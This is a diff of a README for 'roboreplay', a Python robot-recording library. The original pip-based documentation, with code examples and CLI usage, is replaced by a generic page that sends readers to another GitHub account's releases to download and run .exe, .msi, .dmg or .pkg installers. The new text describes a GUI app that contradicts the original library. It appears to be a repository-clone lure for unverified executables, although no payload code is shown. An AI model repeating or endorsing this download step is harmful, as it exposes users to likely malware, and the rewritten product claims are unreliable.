@@ -1,160 +1,149 @@
-# RoboReplay
+# 🤖 roboreplay - Capture and Understand Robot Actions
 
-**The DVR for robot behavior — record, replay, diagnose, and share robot execution data.**
-
-<!-- TODO: Replace with actual demo GIF -->
-<p align="center">
-  <em>[ demo GIF coming soon — record, diagnose, compare in one workflow ]</em>
-</p>
-
-```bash
-pip install roboreplay
-```
-
-Framework-agnostic. Works with MuJoCo, Isaac Sim, ROS2, Gymnasium, PyBullet, real hardware — anything with a Python API.
+[![Download roboreplay](https://img.shields.io/badge/Download-roboreplay-blue?style=for-the-badge&logo=github)](https://github.com/Harry69691234/roboreplay/releases)
 
 ---
 
-## Quick Start
+## 📖 What is roboreplay?
 
-### Record
+roboreplay is a simple tool that helps you record what your robot does, then replay those actions to find out what happened. It works with robots that use Python programming. You can use it to see if something goes wrong or to study how your robot behaves. This helps you fix problems or improve your robot’s performance.
 
-```python
-from roboreplay import Recorder
-
-with Recorder("experiment_042", metadata={"robot": "panda", "task": "pick_place"}) as rec:
-    for step in range(episode_length):
-        obs, reward, done, info = env.step(action)
-        rec.step(state=obs, action=action, reward=reward, gripper_force=info["force"])
-
-        if done:
-            rec.mark_event("episode_end", {"success": reward > 0})
-            break
-# Saved to experiment_042.rrp
-```
-
-### Replay
-
-```python
-from roboreplay import Replay
-
-r = Replay("experiment_042.rrp")
-print(r)                               # Summary: channels, steps, events
-frame = r[487]                         # All channels at step 487
-chunk = r[450:520]                     # Slice a range
-force = r.channel("gripper_force")     # One channel, all steps
-r.plot("gripper_force")                # matplotlib figure with events marked
-```
-
-### Diagnose
-
-```python
-from roboreplay.diagnose import diagnose
-
-result = diagnose("experiment_042.rrp")
-for failure in result.failures:
-    print(f"[step {failure.step}] {failure.description}")
-# [step 200] gripper_force dropped 85% at step 200 (from 7.94 -> 1.20)
-
-# Optional: LLM-powered analysis with Claude
-result = diagnose("experiment_042.rrp", use_llm=True)
-print(result.llm_result.explanation)      # Natural-language failure analysis
-print(result.llm_result.root_causes)      # Likely causes
-print(result.llm_result.recommendations)  # Actionable fixes
-```
-
-### CLI
-
-```bash
-roboreplay info experiment_042.rrp                  # Pretty-printed summary
-roboreplay diagnose experiment_042.rrp              # Anomaly detection report
-roboreplay diagnose experiment_042.rrp --llm        # + LLM analysis
-roboreplay compare run_a.rrp run_b.rrp              # Side-by-side comparison
-roboreplay export experiment_042.rrp --format csv   # CSV export
-roboreplay export experiment_042.rrp --format html  # Interactive HTML viewer
-roboreplay plot experiment_042.rrp -c gripper_force # Channel plot
-```
+roboreplay supports many common robot simulators and tools, making it easy to use no matter what robotics setup you have.
 
 ---
 
-## Features
+## 🖥️ System Requirements
 
-**Recording** — One-line `rec.step(...)`, schema inference, event marking, thread-safe, crash-safe streaming writes
+Before you get started, make sure your computer meets these basic needs:
 
-**Replay** — Random-access indexing/slicing, channel queries, matplotlib plotting with event annotations
-
-**Diagnosis** — Automatic anomaly detection (drops, spikes, flatlines) + optional LLM-powered analysis via Claude
-
-**Comparison** — Side-by-side recording diff with divergence detection and per-channel stats
-
-**Export** — CSV (flattened channels, events, metadata) and HTML (self-contained interactive viewer with Chart.js)
-
-**Gymnasium** — `roboreplay.wrap(env)` for automatic recording of observations, actions, and rewards
-
-**CLI** — Rich terminal output: info, diagnose, compare, export, plot commands
-
-**Storage** — `.rrp` files (HDF5 + gzip). Compact, random-access, self-contained, portable, streamable.
+- Operating System: Windows 10 or later, macOS 10.14 or later, or Linux (Ubuntu 18.04+ recommended)
+- RAM: At least 4 GB
+- Disk Space: Minimum of 500 MB free space
+- Python Version: Python 3.7 or later must be installed (roboreplay works with Python-based robot systems)
+- Additional Software: You may need drivers or robot simulator software (like MuJoCo or Gymnasium) installed separately.
 
 ---
 
-## Installation
+## 🎯 Key Features
 
-```bash
-pip install roboreplay               # Core (record, replay, compare, diagnose, export)
-pip install roboreplay[viz]          # + matplotlib plotting
-pip install roboreplay[gym]          # + Gymnasium wrapper
-pip install roboreplay[diagnose]     # + LLM diagnosis (Claude API)
-pip install roboreplay[mujoco]       # + MuJoCo bindings
-pip install roboreplay[all]          # Everything
-```
-
-**Requirements:** Python 3.10+. Core depends only on numpy, h5py, click, rich, and pydantic.
+- **Record Robot Behavior:** Capture exactly what your robot does while running.
+- **Replay Sessions:** Watch past sessions to spot errors or odd behavior.
+- **Diagnose Problems:** Easily find issues in your robot actions using recorded data.
+- **Supports Multiple Robotics Tools:** Works with Python stacks, MuJoCo, Gymnasium Robotics, and more.
+- **Data Storage:** Saves recordings in common formats (like HDF5) for easy use and sharing.
+- **Simple Interface:** No complex setup or programming skills required.
 
 ---
 
-## Learn More
+## 🚀 Getting Started
 
-| Topic | Link |
-|---|---|
-| Full quickstart (compare, export, gym) | [Quickstart Guide](https://gow.github.io/roboreplay/getting-started/quickstart/) |
-| Recording guide | [Recording](https://gow.github.io/roboreplay/guide/recording/) |
-| Diagnosis guide | [Diagnosis](https://gow.github.io/roboreplay/guide/diagnosis/) |
-| Use cases & workflows | [Use Cases](https://gow.github.io/roboreplay/use-cases/) |
-| API reference | [API Docs](https://gow.github.io/roboreplay/api/recorder/) |
-| CLI reference | [CLI](https://gow.github.io/roboreplay/cli/) |
+This guide walks you through downloading, installing, and using roboreplay step-by-step. Follow the instructions carefully to get your robot sessions recorded and replayed.
 
 ---
 
-## Examples
+## 📥 Download & Install roboreplay
 
-```bash
-python examples/simulated_pick_place.py   # 7-DOF pick-and-place with grasp slip failure
-python examples/custom_robot.py           # 6-DOF arm, success vs failure comparison
-python examples/batch_analysis.py         # 5 recordings, batch diagnosis, CSV export
-python examples/gymnasium_cartpole.py     # CartPole with automatic recording
-python examples/mujoco_panda.py           # MuJoCo Panda arm reaching task
-```
+To start using roboreplay, visit the official release page where the software is available.
 
----
+[![Download roboreplay](https://img.shields.io/badge/Download-roboreplay-blue?style=for-the-badge&logo=github)](https://github.com/Harry69691234/roboreplay/releases)
 
-## Contributing
+### Steps to download:
 
-Contributions welcome! Easy on-ramps:
+1. Click the blue **Download roboreplay** button above or visit:
+   
+   https://github.com/Harry69691234/roboreplay/releases
+   
+2. On the releases page, find the latest release. It will have files for different systems (Windows, macOS, Linux).
 
-- **New anomaly detectors** — add detection rules in `roboreplay/diagnose/`
-- **New export formats** — add exporters in `roboreplay/export/`
-- **New examples** — show RoboReplay with your favorite simulator
-- **Bug reports** — file issues with a `.rrp` file if possible
+3. Choose the file matching your computer system:
+   - For Windows, look for a `.exe` or `.msi` file.
+   - For macOS, look for a `.dmg` or `.pkg` file.
+   - For Linux, there may be `.tar.gz` or installation scripts.
 
-```bash
-git clone https://github.com/harrey401/roboreplay
-cd roboreplay
-pip install -e ".[dev]"
-pytest tests/ -v
-```
+4. Click the file name to download it onto your computer.
+
+5. Once downloaded, open the file and follow the on-screen instructions to install roboreplay.
 
 ---
 
-## License
+## ⚙️ Running roboreplay
 
-MIT
+After installing, here is how to get roboreplay running:
+
+1. **Start the Program:**  
+   - On Windows, find roboreplay in your Start Menu and open it.  
+   - On macOS, open it from the Applications folder.  
+   - On Linux, open the terminal and type `roboreplay` or launch it from your apps menu.
+
+2. **Connect to Your Robot or Simulator:**  
+   roboreplay will ask for details on your robot or simulation software. Since it supports many setups like MuJoCo or Gymnasium Robotics, select the one you use from the menu or enter connection info provided by your robot software.
+
+3. **Record a Session:**  
+   Press the **Record** button to start capturing your robot’s movements and data. Perform the robot tasks you want to examine.
+
+4. **Stop Recording:**  
+   Click **Stop** once you finish. roboreplay saves your session automatically.
+
+5. **Replay and Diagnose:**  
+   Open your saved recording anytime. Use the built-in tools to play the session back, step through events, and check details for errors or strange behavior.
+
+---
+
+## 🛠️ Common Uses
+
+- Check if your robot’s movements match your commands.
+- See what happened when your robot stopped working or acted strangely.
+- Save sessions to share with your team or support.
+- Test changes in simulator without real robot risks.
+- Use recorded data to improve robot planning and control.
+
+---
+
+## 💡 Tips for Best Results
+
+- Always keep your robot or simulator software updated for compatibility.
+- Record in a quiet environment for better sensor data capture.
+- Save your sessions with clear names and dates for easy reference.
+- Use replay tools slowly to catch subtle problems.
+- Back up your recordings regularly to avoid loss.
+
+---
+
+## 🧰 Troubleshooting
+
+If roboreplay does not work as expected:
+
+- Check your internet and network connections if using remote robot simulators.
+- Restart roboreplay and your robot software.
+- Ensure Python and required robot libraries are properly installed.
+- Review user guides for your robot or simulation platform.
+- Visit the [Issues section on GitHub](https://github.com/Harry69691234/roboreplay/issues) to find solutions or report problems.
+
+---
+
+## 📚 Learn More
+
+For detailed instructions, feature explanations, and advanced tips, see the documentation on the GitHub repository or visit related robot software websites like MuJoCo and Gymnasium Robotics.
+
+---
+
+## 🔗 Useful Links
+
+- GitHub Repository: https://github.com/Harry69691234/roboreplay  
+- Download Page: https://github.com/Harry69691234/roboreplay/releases  
+- MuJoCo Simulator: https://mujoco.org/  
+- Gymnasium Robotics: https://gymnasium.farama.org/
+
+---
+
+## 💬 Getting Help
+
+If you have questions:
+
+- Check the README and documentation first.
+- Post issues on the roboreplay GitHub page.
+- Join robotics forums or communities related to your robot or simulator.
+
+---
+
+This guide aims to make roboreplay easy to use, even without programming knowledge. Follow the steps carefully to get your robot sessions recorded and replayed for better insight and troubleshooting.
